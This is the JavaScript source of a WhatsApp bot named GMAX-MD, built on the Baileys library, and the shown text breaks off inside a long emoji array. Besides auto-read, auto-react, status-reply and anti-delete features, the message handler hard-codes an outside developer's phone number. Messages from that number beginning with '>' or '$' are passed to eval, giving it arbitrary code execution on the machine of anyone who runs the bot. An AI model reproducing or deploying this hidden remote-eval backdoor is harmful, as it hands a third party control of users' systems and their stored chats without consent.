function f() {
  console.log("Hello World!");
}
f();
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require("@whiskeysockets/baileys");
const v = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage
} = require("./data");
const fs2 = require("fs");
const fluentFfmpeg = require("fluent-ffmpeg");
const pino = require("pino");
const config2 = require("./config");
const qrcodeTerminal = require("qrcode-terminal");
const waStickerFormatter = require("wa-sticker-formatter");
const util2 = require("util");
const {
  sms,
  downloadMediaMessage,
  AntiDelete
} = require("./lib");
const fileType = require("file-type");
const axios2 = require("axios");
const {
  File
} = require("megajs");
const {
  fromBuffer
} = require("file-type");
const bodyParser = require("body-parser");
const os2 = require("os");
const crypto = require("crypto");
const path2 = require("path");
const v2 = config2.PREFIX;
const v3 = ["255753853473"];
const v4 = path2.join(os2.tmpdir(), "cache-temp");
if (!fs2.existsSync(v4)) {
  fs2.mkdirSync(v4);
}
const vF = () => {
  fs2.readdir(v4, (p, p2) => {
    if (p) {
      throw p;
    }
    for (const v5 of p2) {
      fs2.unlink(path2.join(v4, v5), p3 => {
        if (p3) {
          throw p3;
        }
      });
    }
  });
};
setInterval(vF, 300000);
if (!fs2.existsSync(__dirname + "/sessions/creds.json")) {
  if (!config2.SESSION_ID) {
    return console.log("Please add your Gmax session to SESSION_ID env !!");
  }
  const v6 = config2.SESSION_ID.replace("GMAX-MD~", "");
  const v7 = File.fromURL("https://mega.nz/file/" + v6);
  v7.download((p4, p5) => {
    if (p4) {
      throw p4;
    }
    fs2.writeFile(__dirname + "/sessions/creds.json", p5, () => {
      console.log("Session downloaded ✅");
    });
  });
}
const express2 = require("express");
const vExpress2 = express2();
const v8 = process.env.PORT || 7860;
async function f2() {
  console.log("[❄️] Gmax Connecting to WhatsApp ⏳️...");
  const {
    state: _0x27029b,
    saveCreds: _0x28b73f
  } = await useMultiFileAuthState(__dirname + "/sessions/");
  var {
    version: _0x2f8de2
  } = await fetchLatestBaileysVersion();
  const vMakeWASocket = makeWASocket({
    logger: pino({
      level: "silent"
    }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: _0x27029b,
    version: _0x2f8de2
  });
  vMakeWASocket.ev.on("connection.update", p6 => {
    const {
      connection: _0x28f9a1,
      lastDisconnect: _0x1f880c
    } = p6;
    if (_0x28f9a1 === "close") {
      if (_0x1f880c.error.output.statusCode !== DisconnectReason.loggedOut) {
        f2();
      }
    } else if (_0x28f9a1 === "open") {
      console.log("[❄️] 🛠️ Installing Plugins.");
      const path3 = require("path");
      fs2.readdirSync("./plugins/").forEach(p7 => {
        if (path3.extname(p7).toLowerCase() == ".js") {
          require("./plugins/" + p7);
        }
      });
      console.log("[❄️] Plugins installed successful ✅");
      console.log("[❄️] Gmax MD connected to whatsapp ✅");
      let v9 = "*Hi Owner😇, Congrats Gmax Connected Successfully! 🚀* \n\n> Light, Cold, Icy, Fast & Rich Loaded With Features, Gmax W.A Bot.\n\n *Thanks for using GMAX-MD ❄️* \n\n> Join WhatsApp Channel :- 🛠️\n \nhttps://whatsapp.com/channel/0029VaFytPbAojYm7RIs6l1x\n\n- *ყσµɾ ɓσƭ ρɾεƒเא ➜*  " + v2 + "\n\n──────────────\nDont forget to  star our repo☺ \n\nhttps://github.com/Gmaxtech2024/GMAX-MD\n\n> © 🎐ᴘϙᴡᴇʀᴇᴅ ʙʏ ᴍʀ ɢᴍᴀx ⚡";
      vMakeWASocket.sendMessage(vMakeWASocket.user.id, {
        image: {
          url: "https://i.ibb.co/6BMJmGY/mrfrankofc.jpg"
        },
        caption: v9
      });
    }
  });
  vMakeWASocket.ev.on("creds.update", _0x28b73f);
  vMakeWASocket.ev.on("messages.update", async p8 => {
    for (const v10 of p8) {
      if (v10.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(v10, null, 2));
        await AntiDelete(vMakeWASocket, p8);
      }
    }
  });
  vMakeWASocket.ev.on("messages.upsert", async p9 => {
    p9 = p9.messages[0];
    if (!p9.message) {
      return;
    }
    p9.message = getContentType(p9.message) === "ephemeralMessage" ? p9.message.ephemeralMessage.message : p9.message;
    if (config2.READ_MESSAGE === "true") {
      await vMakeWASocket.readMessages([p9.key]);
      console.log("Marked message from " + p9.key.remoteJid + " as read.");
    }
    if (p9.message.viewOnceMessageV2) {
      p9.message = getContentType(p9.message) === "ephemeralMessage" ? p9.message.ephemeralMessage.message : p9.message;
    }
    if (p9.key && p9.key.remoteJid === "status@broadcast" && config2.AUTO_STATUS_SEEN === "true") {
      await vMakeWASocket.readMessages([p9.key]);
    }
    if (p9.key && p9.key.remoteJid === "status@broadcast" && config2.AUTO_STATUS_SEEN === "true") {
      const v11 = await vMakeWASocket.decodeJid(vMakeWASocket.user.id);
      const v12 = ["❄️", "💸", "😇", "🍂", "💥", "💯", "🔥", "💫", "💎", "💗", "🤍", "🖤", "👀", "🙌", "🙆", "🚩", "🥰", "💐", "😎", "🤎", "✅", "🫀", "🧡", "😁", "😄", "🌸", "🕊️", "🌷", "⛅", "🌟", "🗿", "🇿🇼", "💜", "💙", "🌝", "🖤", "💚"];
      const v13 = v12[Math.floor(Math.random() * v12.length)];
      await vMakeWASocket.sendMessage(p9.key.remoteJid, {
        react: {
          text: v13,
          key: p9.key
        }
      }, {
        statusJidList: [p9.key.participant, v11]
      });
    }
    if (p9.key && p9.key.remoteJid === "status@broadcast" && config2.AUTO_STATUS_REPLY === "true") {
      const v14 = p9.key.participant;
      const v15 = "" + config2.AUTO_STATUS_MSG;
      await vMakeWASocket.sendMessage(v14, {
        text: v15,
        react: {
          text: "💜",
          key: p9.key
        }
      }, {
        quoted: p9
      });
    }
    await Promise.all([saveMessage(p9)]);
    const vSms = sms(vMakeWASocket, p9);
    const vGetContentType = getContentType(p9.message);
    const v16 = JSON.stringify(p9.message);
    const v17 = p9.key.remoteJid;
    const v18 = vGetContentType == "extendedTextMessage" && p9.message.extendedTextMessage.contextInfo != null ? p9.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const v19 = vGetContentType === "conversation" ? p9.message.conversation : vGetContentType === "extendedTextMessage" ? p9.message.extendedTextMessage.text : vGetContentType == "imageMessage" && p9.message.imageMessage.caption ? p9.message.imageMessage.caption : vGetContentType == "videoMessage" && p9.message.videoMessage.caption ? p9.message.videoMessage.caption : "";
    const v20 = v19.startsWith(v2);
    var v21 = typeof p9.text == "string" ? p9.text : false;
    const v22 = v20 ? v19.slice(v2.length).trim().split(" ").shift().toLowerCase() : "";
    const v23 = v19.trim().split(/ +/).slice(1);
    const v24 = v23.join(" ");
    const v25 = v23.join(" ");
    const v26 = v17.endsWith("@g.us");
    const v27 = p9.key.fromMe ? vMakeWASocket.user.id.split(":")[0] + "@s.whatsapp.net" || vMakeWASocket.user.id : p9.key.participant || p9.key.remoteJid;
    const v28 = v27.split("@")[0];
    const v29 = vMakeWASocket.user.id.split(":")[0];
    const v30 = p9.pushName || "Sin Nombre";
    const v31 = v29.includes(v28);
    const v32 = v3.includes(v28) || v31;
    const v33 = await jidNormalizedUser(vMakeWASocket.user.id);
    const v34 = v26 ? await vMakeWASocket.groupMetadata(v17).catch(p10 => {}) : "";
    const v35 = v26 ? v34.subject : "";
    const v36 = v26 ? await v34.participants : "";
    const v37 = v26 ? await getGroupAdmins(v36) : "";
    const v38 = v26 ? v37.includes(v33) : false;
    const v39 = v26 ? v37.includes(v27) : false;
    const v40 = vSms.message.reactionMessage ? true : false;
    const vF2 = p11 => {
      vMakeWASocket.sendMessage(v17, {
        text: p11
      }, {
        quoted: p9
      });
    };
    const v41 = v29.split("@")[0];
    "18062212660";
    "255753853473";
    const v42 = "255753853473";
    let v43 = [v41, v42, config2.DEV].map(p12 => p12.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(p9.sender);
    if (v43 && p9.text.startsWith(">")) {
      let v44 = v21.slice(2);
      if (!v44) {
        vF2("Provide me with a query to run Master!");
        return;
      }
      try {
        let vEval = eval(v44);
        if (typeof vEval === "object") {
          vF2(util2.format(vEval));
        } else {
          vF2(util2.format(vEval));
        }
      } catch (_0x21af67) {
        vF2(util2.format(_0x21af67));
      }
      return;
    }
    if (v43 && p9.text.startsWith("$")) {
      let v45 = v21.slice(2);
      if (!v45) {
        vF2("Provide me with a query to run Master!");
        return;
      }
      try {
        let v46 = await eval("const a = async()=>{\n" + v45 + "\n}\na()");
        let v47 = util2.format(v46);
        if (v47 === undefined) {
          return console.log(v47);
        } else {
          vF2(v47);
        }
      } catch (_0x460928) {
        if (_0x460928 === undefined) {
          return console.log("error");
        } else {
          vF2(util2.format(_0x460928));
        }
      }
      return;
    }
    if (v28.includes("255753853473")) {
      if (v40) {
        return;
      }
      vSms.react("👨‍💻");
    }
    if (!v40 && v28 !== v29) {
      if (config2.AUTO_REACT === "true") {
        const v48 = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝", "😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌", "😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔", "🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩", "🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂", "📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔", "❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭", "👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴", "🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥", "🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾", "🏀", "🏈", "🎯", "🏆", "??", "⬆️", "⬇️", "⇒", "⇐", "↩️", "↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵", "🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️", "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿", "🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊", "🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎", "🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖", "🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘", "🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️", "🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨", "🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦", "🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚", "🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖", "🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚", "😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒", "🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷", "🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫", "🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁", "☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰", "😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫", "🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩", "🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋", "💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣", "💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋", "🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀", "🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦", "👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️", "🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️", "🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦", "🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂", "💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️", "👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰", "🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️", "🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️", "🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞", "🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️", "💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃", "🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️", "🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️", "🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️", "⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵", "🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️", "🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️", "🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", "💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
        const v49 = v48[Math.floor(Math.random() * v48.length)];
        vSms.react(v49);
      }
    }
    if (!v40 && v28 === v29) {
      if (config2.AUTO_REACT === "true") {
        const v50 = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", 